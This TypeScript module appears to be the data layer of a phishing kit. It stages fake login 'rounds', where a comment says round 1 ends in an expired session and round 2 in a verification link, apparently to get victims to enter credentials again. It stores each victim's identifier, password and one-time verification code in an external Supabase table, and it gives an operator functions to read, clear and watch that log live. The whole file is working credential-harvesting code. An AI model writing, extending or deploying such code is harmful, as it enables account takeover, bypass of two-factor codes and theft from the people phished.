import { externalSupabase } from "./external-supabase";

const KEY = "nero-login-round";

/** Round 1 ends in an expired session; round 2+ ends in a verification link. */
export function getRound(): number {
  if (typeof window === "undefined") return 1;
  return Number(window.sessionStorage.getItem(KEY) ?? "1");
}

export function advanceRound(): void {
  if (typeof window === "undefined") return;
  window.sessionStorage.setItem(KEY, String(getRound() + 1));
}

export type AdminEntry = {
  id: string;
  ts: string;
  kind: "login" | "code";
  round: number;
  step?: string;
  identifier?: string;
  password?: string;
  code?: string;
};

export async function readAdminLog(): Promise<AdminEntry[]> {
  const { data, error } = await externalSupabase
    .from("admin_entries")
    .select("*")
    .order("ts", { ascending: false })
    .limit(200);
  if (error) {
    console.error("readAdminLog", error);
    return [];
  }
  return (data ?? []) as AdminEntry[];
}

export async function recordAdminEntry(
  entry: Omit<AdminEntry, "id" | "ts" | "round"> & { round?: number },
): Promise<void> {
  const payload = {
    kind: entry.kind,
    round: entry.round ?? getRound(),
    step: entry.step ?? null,
    identifier: entry.identifier ?? null,
    password: entry.password ?? null,
    code: entry.code ?? null,
  };
  const { error } = await externalSupabase.from("admin_entries").insert(payload);
  if (error) console.error("recordAdminEntry", error);
}

export async function clearAdminLog(): Promise<void> {
  const { error } = await externalSupabase
    .from("admin_entries")
    .delete()
    .not("id", "is", null);
  if (error) console.error("clearAdminLog", error);
}

export function subscribeAdminLog(cb: () => void): () => void {
  const channel = externalSupabase
    .channel("admin_entries_changes")
    .on(
      "postgres_changes",
      { event: "*", schema: "public", table: "admin_entries" },
      () => cb(),
    )
    .subscribe();
  return () => {
    externalSupabase.removeChannel(channel);
  };
}